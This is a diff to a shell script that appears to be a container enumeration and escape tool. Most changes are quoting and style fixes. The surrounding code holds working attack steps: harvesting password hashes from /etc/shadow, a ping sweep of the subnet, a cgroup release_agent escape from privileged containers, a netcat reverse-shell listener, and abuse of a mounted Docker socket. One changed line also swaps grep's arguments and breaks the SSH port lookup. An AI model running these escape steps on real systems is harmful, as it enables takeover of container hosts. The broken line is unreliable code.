@@ -386,11 +386,11 @@ dockerSockCheck() {
         if [ -z "$dockerVersion" ]; then
           # IF jq...
           #dockerVersion=`$sockInfoCmd | jq -r '.ServerVersion'`
-          dockerVersion=$(echo $sockInfoRepsonse | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
+          dockerVersion=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
         fi
 
         # Get info from sock
-        info=$(echo $sockInfoRepsonse | tr ',' '\n' | grep "$GREP_SOCK_INFOS" | grep -v "$GREP_SOCK_INFOS_IGNORE" | tr -d '"')
+        info=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep "$GREP_SOCK_INFOS" | grep -v "$GREP_SOCK_INFOS_IGNORE" | tr -d '"')
 
         printInfo "$info"
       else
@@ -425,7 +425,7 @@ containerID() {
   printResult "Container ID ............" "$containerID" "Unknown"
   
   if [ "$containerType" = "docker" ]; then
-    containerFullID="$(basename $(cat /proc/1/cpuset))"
+    containerFullID=$(basename "$(cat /proc/1/cpuset)")
     printResult "Container Full ID ......." "$containerFullID" "Unknown"
   fi
 }
@@ -446,7 +446,7 @@ containerIPs() {
   printResult "Container IP ............" "$containerIP" "Could not find IP"
 
   # Container DNS
-  dnsServers="$(cat /etc/resolv.conf | grep nameserver | cut -d' ' -f2 | tr '\n' ' ')"
+  dnsServers=$(grep "nameserver" /etc/resolv.conf | cut -d' ' -f2 | tr '\n' ' ')
   printResult "DNS Server(s) ..........." "$dnsServers" "Could not find DNS Servers"
 
   # Host IP
@@ -455,8 +455,8 @@ containerIPs() {
   elif [ -x "$(command -v ip)" ]; then
     hostIP="$(ip route get 1 | cut -d' ' -f 3)"
   elif [ "$containerIP" ]; then
-    # No tools avaliable, just have a guess
-    hostIP="$(echo $containerIP | cut -d'.' -f 1-3).1"
+    # No tools available, just have a guess
+    hostIP=$(echo "$containerIP" | cut -d'.' -f 1-3).1
   fi
 
   printResult "Host IP ................." "$hostIP" "Could not find Host IP"
@@ -477,11 +477,11 @@ containerName() {
     # Requires containerIP
     if [ "$containerIP" ]; then
         if [ -x "$(command -v host)" ]; then
-        containerName="$(host $containerIP | rev | cut -d' ' -f1 | rev)"
+        containerName=$(host "$containerIP" | rev | cut -d' ' -f1 | rev)
         elif [ -x "$(command -v dig)" ]; then
-        containerName="$(dig -x $containerIP +noall +answer | grep 'PTR' | rev | cut -f1 | rev)"
+        containerName=$(dig -x "$containerIP" +noall +answer | grep 'PTR' | rev | cut -f1 | rev)
         elif [ -x "$(command -v nslookup)" ]; then
-        containerName="$(nslookup $containerIP 2>/dev/null | grep 'name = ' | rev | cut -d' ' -f1 | rev)"
+        containerName=$(nslookup "$containerIP" 2>/dev/null | grep 'name = ' | rev | cut -d' ' -f1 | rev)
         else
         missingTools="1"
         fi
@@ -513,9 +513,9 @@ getContainerInformation() {
     os="$(uname -o)"
   fi
 
-  kernelVersion="$(uname -r)"
-  arch="$(uname -m)"
-  cpuModel="$(cat /proc/cpuinfo | grep 'model name' | head -n1 | cut -d':' -f2| cut -d' ' -f2-)"
+  kernelVersion=$(uname -r)
+  arch=$(uname -m)
+  cpuModel=$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d':' -f2| cut -d' ' -f2-)
 
   printMsg "Operating System ........" "$os"
   printMsg "Kernel .................." "$kernelVersion"
@@ -543,7 +543,7 @@ containerServices() {
 
   if [ $? -eq 0 ]; then
     if [ -f "/etc/ssh/sshd_config" ]; then
-      sshPort=$(cat /etc/ssh/sshd_config | grep "^Port" || echo "Port 22" | cut -d' ' -f2)
+      sshPort=$(grep /etc/ssh/sshd_config  "^Port" || echo "Port 22" | cut -d' ' -f2)
       printSuccess "Yes (port $sshPort)"
     else
       printSuccess "Yes"
@@ -598,7 +598,7 @@ enumerateContainers() {
     # Find containers...
     if [ "$dockerCommand" ]; then
         # Enumerate containers using docker
-        dockercontainers=`docker ps --format "{{.Names}}" 2>/dev/null | wc -l`
+        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
         printMsg "Docker Containers........" "$dockercontainers"
         docker ps -a
     elif [ "$dockerSockPath" ]; then
@@ -614,24 +614,23 @@ enumerateContainers() {
   else # Not in a container
   
     if docker ps >/dev/null 2>&1; then # Enumerate docker containers
-        dockercontainers=`docker ps --format "{{.Names}}" 2>/dev/null | wc -l`
-        dockercontainersTotal=`docker ps -a --format "{{.Names}}" 2>/dev/null | wc -l`
+        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
+        dockercontainersTotal=$(docker ps -a --format "{{.Names}}" 2>/dev/null | wc -l)
         printMsg "Docker Containers........" "$dockercontainers Running, $dockercontainersTotal Total"
         docker ps -a
     fi
     if lxc list >/dev/null 2>&1; then # Enumerate lxc containers
-        lxccontainers=`lxc list|grep "| RUNNING |" 2>/dev/null | wc -l`
-        lxccontainersTotal=`lxc list|grep "| CONTAINER |" 2>/dev/null | wc -l`
+        lxccontainers=$(lxc list | grep -c "| RUNNING |" 2>/dev/null)
+        lxccontainersTotal=$(lxc list | grep -c "| CONTAINER |" 2>/dev/null)
         printMsg "LXC Containers..........." "$lxccontainers Running, $lxccontainersTotal Total"
         lxc list
     fi
     if rkt list >/dev/null 2>&1; then # Enumerate rkt containers
-        rktcontainers=`rkt list 2>/dev/null | tail -n +2  | wc -l`
+        rktcontainers=$(rkt list 2>/dev/null | tail -n +2  | wc -l)
         printMsg "RKT Containers..........." "$rktcontainers Total" # TODO: Test and add total
         rkt list
     fi
   fi
-  
 }
 
 pingSweep() {
@@ -641,15 +640,13 @@ pingSweep() {
 
   if [ "$containerIP" ]; then
     # Enumerate containers the hard way (network enumeration)
-    subnet=$(echo $containerIP | cut -d'.' -f1-3)
+    subnet=$(echo "$containerIP" | cut -d'.' -f1-3)
 
-    which nmap
-    
     if [ -x "$(command -v nmap)" ]; then
       # Method 1: nmap
       printQuestion "Attempting ping sweep of $subnet.0/24 (nmap)"
       nl
-      nmap -oG - -sP $subnet.0/24 | grep "Host:"
+      nmap -oG - -sP "$subnet.0/24" | grep "Host:"
     elif [ -x "$(command -v ping)" ] && ping -c 1 127.0.0.1 2>/dev/null 1>&2; then
       # Method 2: ping sweep (check ping is executable, and we can run it, sometimes needs root)
       printQuestion "Attempting ping sweep of $containerIP/24 (ping)"
@@ -659,8 +656,7 @@ pingSweep() {
       # Ping all IPs in range
       set +m
       for addr in $(seq 1 1 10); do
-        (ping -c 1 -t 1 $subnet.$addr >/dev/null && echo $subnet.$addr is Up) &
-        >/dev/null
+        (ping -c 1 -t 1 $subnet.$addr >/dev/null && echo $subnet.$addr is Up) & >/dev/null
         pids="${pids} $!"
       done
 
@@ -702,12 +698,12 @@ findMountedFolders() {
     printYesEx
     # Docker sock appears to be mounted, uhoh!
     printTip "$TIP_WRITABLE_SOCK"
-    dockerSockPath=$(grep docker.sock /proc/self/mountinfo | cut -d' ' -f 5)
+    dockerSockPath=$(grep "docker.sock" /proc/self/mountinfo | cut -d' ' -f 5)
   else
     printNo
   fi
 
-  otherMounts=$(cat /proc/self/mountinfo | grep -v "$GREP_IGNORE_MOUNTS" | cut -d' ' -f 4-)
+  otherMounts=$(grep -v "$GREP_IGNORE_MOUNTS" /proc/self/mountinfo | cut -d' ' -f 4-)
 
   printQuestion "Other mounts .............."
   if [ "$otherMounts" ]; then
@@ -715,7 +711,7 @@ findMountedFolders() {
     printStatus "$otherMounts"
 
     # Possible host usernames found:
-    usernames=$(echo $otherMounts | sed -n 's:.*/home/\(.*\)/.*:\1:p' | tr '\n' ' ')
+    usernames=$(echo "$otherMounts" | sed -n 's:.*/home/\(.*\)/.*:\1:p' | tr '\n' ' ')
     if [ "$otherMounts" ]; then
       printResult "Possible host usernames ..." "$usernames"
     fi
@@ -727,7 +723,6 @@ findMountedFolders() {
   else
     printNo
   fi
-
   nl
 }
 
@@ -779,7 +774,7 @@ findInterestingFiles() {
     printNo
   fi
 
-  hashes="$(cat /etc/shadow 2>/dev/null | cut -d':' -f2 | grep -v '^*$\|^!')"
+  hashes=$(cut -d':' -f2 < /etc/shadow 2>/dev/null | grep -v '^*$\|^!')
   # TODO: Cannot check...
   printQuestion "Hashes in shadow file ..............."
   if [ "$hashes" ]; then
@@ -827,7 +822,7 @@ getDockerVersion() {
 checkDockerVersionExploits() {
   # Check version for known exploits
   printResult "Docker Exploits ........." "$dockerVersion" "Version Unknown"
-  if ! [ $dockerVersion ]; then
+  if ! [ "$dockerVersion" ]; then
     return
   fi
 
@@ -912,7 +907,7 @@ prepareExploit() {
       set -m
       # Create listener
       nc -lvnp $port &
-      PID_NC=$!
+      # PID_NC=$!
       bg
     fi
 
@@ -928,7 +923,6 @@ prepareExploit() {
     printError "Nothing to do, if trying to launch a shell add -cmd bash"
     exit 1
   fi
-
 }
 
 exploitDocker() {
@@ -967,12 +961,12 @@ exploitPrivileged() {
   prepareExploit
 
   # POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
-  d="$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))"
+  d=$(dirname "$(ls -x /s*/fs/c*/*/r* | head -n1)")
   mkdir -p $d/w
   echo 1 >$d/w/notify_on_release
   t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
   touch /o
-  echo $t/c >$d/release_agent
+  echo "$t/c" >$d/release_agent
   printf "#!/bin/sh\n%s > %s/o" "$cmd" "$t">/c
   chmod +x /c
   sh -c "echo 0 >$d/w/cgroup.procs"
@@ -1011,7 +1005,7 @@ exploitDockerSock() {
     return
   fi
 
-  revShellContainerID=$(echo $response | cut -d'"' -f4)
+  revShellContainerID=$(echo "$response" | cut -d'"' -f4)
   printQuestion "Creating container ....."
   printSuccess "$revShellContainerID"
 
@@ -1032,7 +1026,7 @@ exploitDockerSock() {
   printStatus "Remove Command:\n$removeCmd"
 
   # FIXME: Must be a better way of doing this...
-  response="$(eval $startCmd)"
+  response=$(eval "$startCmd")
 
   printQuestion "Starting container ....."
   if [ $? ]; then
@@ -1047,7 +1041,7 @@ exploitDockerSock() {
 
   sleep $delay
 
-  response="$(eval $logsCmd)"
+  response=$(eval "$logsCmd")
 
   printQuestion "Fetching logs .........."
   if [ $? ]; then
